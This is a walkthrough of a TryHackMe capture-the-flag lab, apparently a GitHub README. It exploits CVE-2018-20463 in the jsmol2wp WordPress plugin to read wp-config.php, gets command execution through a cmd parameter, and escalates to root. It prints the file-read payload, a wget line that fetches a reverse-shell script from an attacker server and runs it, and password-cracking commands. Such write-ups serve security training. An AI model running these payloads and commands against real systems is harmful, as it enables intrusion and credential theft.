# This is a Medium Level Tryhackme Lab, Where we exploit a wordpress website which is vulnerable to SSRF(Server Side Request Forgery) that is marked CVE-2018-20463. which allow   us  to read any file on the server . then we Get a foothold by and start to Lateral Move from user to user until we Reach root.


# 1- Reconnaissance
We Start with a basic nmap scan, Then a version Scan to see if there are any outdated softwares 

<img width="1862" height="647" alt="Screenshot 2026-11-18 005018" src="https://github.com/user-attachments/assets/ededd05e-104a-4141-9618-56ad40ce7f36" />

<img width="1872" height="772" alt="Screenshot 2026-11-18 005144" src="https://github.com/user-attachments/assets/fbf58e38-3a6e-4d90-9e0b-37588a5c71e7" />

# 2 - Interesting we find a website running on port 80 and ssh on 22.Its Runnign wordpress version 6.7.1.I started looking for Known exploits 
<img width="1872" height="407" alt="Screenshot 2026-11-18 005214" src="https://github.com/user-attachments/assets/bbc6cc41-6d09-4974-82d3-e637d82ee648" />



##
# 3- Then i Started enumerating the wordpress website using wpscan, it is  black-box WordPress vulnerability scanner used to audit WordPress websites for security flaws, misconfigurations, and outdated components

```
wpscan --url http://target.com/ -e ap
```
-e - enumerate 
ap- all plugins
<img width="1870" height="767" alt="Screenshot 2026-11-18 005315" src="https://github.com/user-attachments/assets/97d84b88-2503-4c0d-a712-41baf792aaf8" />

<img width="1871" height="757" alt="Screenshot 2026-11-18 005329" src="https://github.com/user-attachments/assets/23650915-1641-4763-b6b2-9b918fb0a52c" />



##

# 4- It found a Plugin called jsmol2wp. i started searching for CVES about it and found one which is. Which is SSRF TO file Read.
<img width="935" height="242" alt="Screenshot 2026-11-18 005406" src="https://github.com/user-attachments/assets/e7d3f7d9-74f5-49c8-9c97-0597840052d9" />



##

# 5 - I started searching for the poc and found one on the github profile which is mentioned below. and used the payload
```
http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=getRawDataFromDatabase
&query=php://filter/resource=../../../../wp-config.php
```
https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt
```
```
# 6 - We can read the config files, which left us some credentials of a user called "wpuser" 
<img width="1911" height="887" alt="Screenshot 2026-11-18 010055" src="https://github.com/user-attachments/assets/60c4dd3e-3ee1-47e6-aaf7-09c541604294" />


##

# 7 - After looking in the webite i find nothing important and then something caught my eyes, the admin left us something 

<img width="1917" height="941" alt="Screenshot 2026-11-18 010206" src="https://github.com/user-attachments/assets/c3c684c8-f79a-4d75-b933-434722ec0a50" />

##
# 8 - it is hinting that there is a file somewhere on the server i used the same payload we used above which is given below but instead of the config file i tried some names like doll.php,hello.php,hellodoll.php,dollhello.php. Only 1 worked out which is hello.php

```
http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=getRawDataFromDatabase
&query=php://filter/resource=../../../../wp-config.php
```
<img width="1917" height="736" alt="Screenshot 2026-11-18 010233" src="https://github.com/user-attachments/assets/ab75fb1e-01eb-4423-b1a9-f42b2439e947" />


# 8 - i decoded the base64 encoded line and got this, it is hinting for a cmd parameter abuse .
<img width="1862" height="207" alt="Screenshot 2026-11-18 010256" src="https://github.com/user-attachments/assets/4bf4671d-984e-4ed5-b821-03724fe699d0" />
##
# 9 - I injected ?cmd=id and boom we have code execution is on 
<img width="1917" height="842" alt="Screenshot 2026-11-18 010433" src="https://github.com/user-attachments/assets/0aa4afd5-8332-4982-a529-72546d8b3b4d" />
##

# 10 - I injected a reverse shell but there was a firewall blocking me, Then i tried to encode it to bypass the filter but still did not get lucky 
<img width="1917" height="912" alt="Screenshot 2026-11-18 011721" src="https://github.com/user-attachments/assets/143e6556-9e19-4985-b0bc-8adedf9c4b3e" />

<img width="1862" height="645" alt="Screenshot 2026-11-18 011637" src="https://github.com/user-attachments/assets/651f175e-e03b-4dbc-bbb3-9d14a3335b08" />

## 
# 11 - After trying bypass fitler techniques i came across file shell upload. we upload a reverse shell and execute it from the cmd parameter.
Started a python server to upload the reverse shell
<img width="1876" height="668" alt="Screenshot 2026-11-18 011927" src="https://github.com/user-attachments/assets/759211b0-7688-43c0-adc7-8206f6513fba" />
Then used the command 

```
wget http://ipadrrr:portnumber/file.sh -O /tmp/shell.sh
```
-O stores the file in /tmp directory
<img width="1917" height="916" alt="Screenshot 2026-11-18 011941" src="https://github.com/user-attachments/assets/cda84ce1-654d-49f0-b711-1cf168e83241" />
##

# 12 - We got this message on our machine which means file is uploaded on the server successfully, 
<img width="1871" height="650" alt="Screenshot 2026-11-18 011959" src="https://github.com/user-attachments/assets/028c7174-5d37-480e-93aa-16fcf14529f4" />

# 13 - Time to execute the shell 
```
bash /tmp/file.sh
```

<img width="1917" height="912" alt="Screenshot 2026-11-18 013115" src="https://github.com/user-attachments/assets/2b3debb8-a2eb-4bd9-bcd8-3c8a3caebc21" />
<img width="1881" height="671" alt="Screenshot 2026-11-18 013434" src="https://github.com/user-attachments/assets/3adef812-2942-4984-987b-485035b5e760" />

##
# 14 - We got a foothold time to eneumreate for privilege escalation, i tried tranferring and using linpeas but gave me false positive flags, and no suid binaries i ran "ps aux" and i found a mysql server running i used wpuser credentials 
<img width="1152" height="617" alt="Screenshot 2026-11-18 013543" src="https://github.com/user-attachments/assets/283ece2c-955d-4d9b-8c73-0ad53bca6213" />

<img width="1100" height="260" alt="image" src="https://github.com/user-attachments/assets/39b886bd-cdc0-4a02-97ac-82f46474f809" />


# 15 - I took diego hashed password and tried to crack the hashed password using johntheripper tool 
<img width="1856" height="658" alt="Screenshot 2026-11-18 015823" src="https://github.com/user-attachments/assets/b9cac26c-a951-4650-b060-8f75e14bb379" />

# 16 - i switched to diego and diego can access the user "think" directory and from there we fidn a .ssh which we take the id_rsa of think and login via ssh

<img width="1871" height="667" alt="Screenshot 2026-11-18 015944" src="https://github.com/user-attachments/assets/3e43b369-87a3-420f-8f72-c06ea5faebb3" />

# 17 - i logged in as think, and to search for anything that could help me i found a file called wordpress.old.zip which we dont permission to unzip. then i came to a point to start a python server on the comprised machine and transfer the zip file and brute force it offline.
then now we can brute force it using the command below
```
zip2john wordpress.old.zip > hash.txt
```
<img width="1867" height="658" alt="image" src="https://github.com/user-attachments/assets/8f02ce62-2d86-4e85-a99e-f6b9fc4457ef" />
##
# 18 -  then i brute forced it using the command 
```
john --format=phpass --wordlist=path/to/rockyou.txt hash.txt
```
NOTE: u should take the hash till index.php file which as shwon in the screenshot 
<img width="1846" height="288" alt="image" src="https://github.com/user-attachments/assets/fb666d97-a05d-4429-9984-c3ce4f791678" />

# 19 - john cracked the hash for us which is, and then i unzipped it 
<img width="1862" height="653" alt="image" src="https://github.com/user-attachments/assets/7e4ccf9b-a330-462d-8242-7449f508e3dd" />
<img width="1867" height="657" alt="image" src="https://github.com/user-attachments/assets/8c314553-af48-4d98-848b-8c9b596d60e3" />


##

# 20 - after unzipping the files i looked inside wp-admin, wp-login.php, forgot to look inside wp-conifg.php, which then i looked at and found xavi credentials sitting there
<img width="1857" height="641" alt="image" src="https://github.com/user-attachments/assets/be23bb8e-64a4-4118-befb-3f1929d67150" />

##
# 21 - i switch user to xavi using "su xavi" then ran sudo -l to see what are things i can do and boom we can do everything 
<img width="1857" height="641" alt="image" src="https://github.com/user-attachments/assets/204b2684-c294-43f0-80c5-9c4b1160d341" />
##
# 22 - i used the command "sudo /bin/bash" this spawns me a root shell.  then i looked for user.txt file which was sitting in diego directory, and the root file which was in the root directory. 
<img width="1871" height="661" alt="image" src="https://github.com/user-attachments/assets/f9a83241-54f2-437e-997a-2474d9e00831" />




















